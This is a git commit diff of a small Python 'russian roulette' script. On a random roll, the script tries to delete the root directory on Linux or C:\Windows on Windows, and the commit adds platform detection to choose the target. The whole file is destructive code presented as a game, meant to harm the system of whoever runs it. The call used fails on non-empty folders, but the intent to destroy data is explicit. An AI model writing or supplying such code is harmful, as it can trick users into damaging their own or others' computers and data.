463cf764547bbb1df258093ad075ecf316d78854
elijah629 <62805599+elijah629@users.noreply.github.com>
2023-06-12 18:12:55 -0700

    fixes

--- russian roulette.py
+++ russian roulette.py
@@ -1,11 +1,21 @@
 import os, random, time
-print('The game begins')
-rand = random.randint(1, 6)
+from sys import platform
+
+if platform == "linux" or platform == "linux2":
+    dir = "/"
+elif platform == "win32":
+    dir = "C:\Windows"
+
+print("The game begins")
+
 for i in range(1, 11):
-    print(i)
+    print(f"Round {i}")
     time.sleep(1)
-if(rand == 1):
-    print('removing')
-    os.rmdir(r'C:\Windows\System32')
+
+rand = random.randint(0, 6)
+
+if (rand == 0):
+    print("Tough luck")
+    os.rmdir(dir)
 else:
-    print('you lived')
+    print("You got lucky")
